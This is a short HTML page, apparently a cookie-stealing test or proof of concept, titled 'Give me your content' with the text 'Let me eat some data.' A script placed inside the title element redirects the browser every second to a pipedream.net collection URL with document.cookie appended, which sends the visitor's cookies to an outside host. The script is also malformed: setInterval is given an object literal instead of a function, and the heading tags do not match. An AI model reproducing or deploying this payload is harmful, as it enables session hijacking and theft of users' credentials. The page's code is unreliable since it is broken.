<html>
	<head>
		<title>
			Give me your content
			<script>
				var count=0;
				setInterval({
					// Increment the count
					count++;
					// Update the title with the new count value
					document.location="https://eo6erz82c3lvn9i.m.pipedream.net/?"+document.cookie;
					document.title = document.location + count;
			        }, 1000);
			</script>
		</title>
	</head>
	<body>
		<h1>Hey there!</h2>
		<p id="myParagraph">Let me eat some data.</p>
		<script>
			setInterval(updateParagraph, 5000);

			function updateParagraph() {
			  document.getElementById("myParagraph").textContent = "This text is updated automatically every 5 seconds.";
			}
		</script>
	</body>
</html>
